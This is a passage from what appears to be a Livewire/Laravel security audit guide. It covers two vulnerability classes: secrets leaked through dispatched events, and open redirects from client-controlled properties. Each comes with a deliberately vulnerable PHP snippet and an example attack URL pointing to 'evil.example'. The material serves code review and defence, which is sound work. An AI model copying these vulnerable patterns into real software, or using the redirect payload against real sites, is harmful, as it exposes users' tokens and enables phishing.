Version notes: v4 feature surface (`$this->js`, `$wire.$js`); the injection risk is the same
wherever `$this->js()`/`#[Js]` exists.

Fix: see fixes.md "js-params-not-interpolation"

---

## LW-26: Sensitive data leaked through dispatched events

Severity guidance: Critical when a secret, token, or another user's data is dispatched;
High when internal data not meant for the client is dispatched; Medium for low-sensitivity
over-exposure.

Look for: `$this->dispatch('event', key: <sensitive>)` (and `dispatch(...)->to(Component::class)`)
carrying secrets, tokens, full PII, or another user's data. Dispatched event names and params
serialize into the `dispatches` effect of the JSON response and are delivered to the browser
in plaintext — they are NOT in `wire:snapshot`, so an LW-08 snapshot audit misses them, and
`->to()` is routing, not confidentiality (the payload still round-trips through the client).

```php
$this->dispatch('balance-updated',
    balance: $account->raw_balance,
    token: $account->plaid_token,        // ships to the browser in the response, readable in the network tab
)->to(BalanceWidget::class);
```

Why exploitable: the attacker (or any third-party Alpine listener / browser devtools) reads
the dispatched params straight from the network response; `->to()` does not keep them server-
side. A token or another user's data dispatched "to a sibling component" is exposed to the
client regardless of the target.

Version notes: identical in v3 and v4; dispatch params serialize to the client response in
both.

Fix: see fixes.md "dispatch-ids-not-data"

---

## LW-27: Open redirect from a client-controlled property

Severity guidance: High when a `#[Url]`/public property or action parameter sets a redirect
target with no allow-list (phishing via a trusted-looking flow); Medium when the value is
constrained but not to same-origin; Low when only a path segment is client-influenced.

Look for: `redirect(...)`, `$this->redirect(...)`, `->redirectRoute(...)`, `redirectIntended`,
or a `wire:navigate`-driven redirect whose target derives from a public property, a `#[Url]`
property, or an action parameter, with no allow-list or relative-path constraint. Livewire
hands the URL to Laravel's redirector with no host check (SupportRedirects), so a
client-controlled absolute URL is an open redirect — and with `navigate` it is a same-tab SPA
navigation to the attacker origin.

```php
#[Url] public $returnTo;
public function finish() {
    return $this->redirect($this->returnTo);   // ?returnTo=https://evil.example/login
}
```

Why exploitable: the attacker crafts `?returnTo=https://evil.example/login` (or
`$wire.set('returnTo', '//evil')`); after the action the victim is sent to a phishing page on
what looked like a trusted post-login/post-checkout flow.

Version notes: identical in v3 and v4; `redirect()` has no host allow-list in either, and
`wire:navigate` redirects route through the same path.

Fix: see fixes.md "allowlist-redirect-target"
